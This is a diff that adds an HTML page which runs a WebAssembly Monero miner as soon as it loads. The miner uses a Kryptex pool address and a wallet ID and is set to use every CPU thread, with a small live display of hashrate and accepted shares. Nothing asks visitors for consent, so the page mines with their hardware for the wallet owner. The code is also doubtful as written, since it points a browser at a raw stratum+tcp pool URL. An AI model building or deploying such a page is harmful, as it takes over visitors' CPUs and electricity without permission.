@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Kryptex XMR Mining (WASM)</title>
+    <script src="https://cdn.jsdelivr.net/npm/webassembly-miner@1.2/dist/miner.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
+        #status { color: green; font-weight: bold; }
+        #stats { margin-top: 20px; background: #f5f5f5; padding: 15px; border-radius: 5px; }
+    </style>
+</head>
+<body>
+    <h1>Kryptex XMR Mining</h1>
+    <div id="status">Initializing...</div>
+    <div id="stats">
+        <p>Hashrate: <span id="hashes">0</span> H/s</p>
+        <p>Accepted: <span id="accepted">0</span> shares</p>
+    </div>
+
+    <script>
+        const miner = new WASMMiner({
+            pool: "stratum+tcp://xmr.kryptex.network:7777",
+            wallet: "krxYN6R87Q.worker",
+            password: "x",
+            threads: navigator.hardwareConcurrency,
+            autoThreads: false
+        });
+
+        miner.start().then(() => {
+            document.getElementById("status").textContent = "Mining active!";
+        }).catch(err => {
+            document.getElementById("status").textContent = "Error: " + err.message;
+            document.getElementById("status").style.color = "red";
+        });
+
+        // Update stats every second
+        setInterval(() => {
+            document.getElementById("hashes").textContent = miner.getHashesPerSecond().toFixed(2);
+            document.getElementById("accepted").textContent = miner.getAcceptedHashes();
+        }, 1000);
+    </script>
+</body>
+</html>
